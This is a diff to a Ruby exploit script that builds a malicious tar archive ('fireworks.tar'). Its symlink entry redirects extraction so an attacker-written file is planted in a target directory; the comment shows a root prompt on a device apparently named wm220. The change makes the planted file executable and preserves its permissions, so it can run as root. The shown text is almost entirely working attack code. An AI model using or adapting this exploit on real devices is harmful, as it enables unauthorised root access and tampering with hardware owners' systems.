@@ -144,14 +144,15 @@ nastyfile = nastyfile.join("")
 
 system("rm -rf symlink Burning0day.txt fireworks.tar")
 system("echo 'get root... Thx for all the fish P0V' > Burning0day.txt")
-system("tar cf fireworks.tar Burning0day.txt")
+system("tar cpf fireworks.tar Burning0day.txt")
 system("ln -s " + destdir + " symlink")
 system("tar --append -f fireworks.tar symlink")
 system("rm -rf symlink")
 system("mkdir -p symlink")
 
 File.open("symlink/" + destfile , 'w') {|f| f.write(nastyfile) }
-system("tar --append -f fireworks.tar symlink/" + destfile)
+system("chmod 755 " + "symlink/" + destfile )
+system("tar --append -pf fireworks.tar symlink/" + destfile)
 
 # root@wm220_dz_ap0002_v1:/ # ls -al /data/thx_darksimpson.sh  
 # -rw-r--r-- root     20             39 2017-07-01 23:50 thx_darksimpson.sh
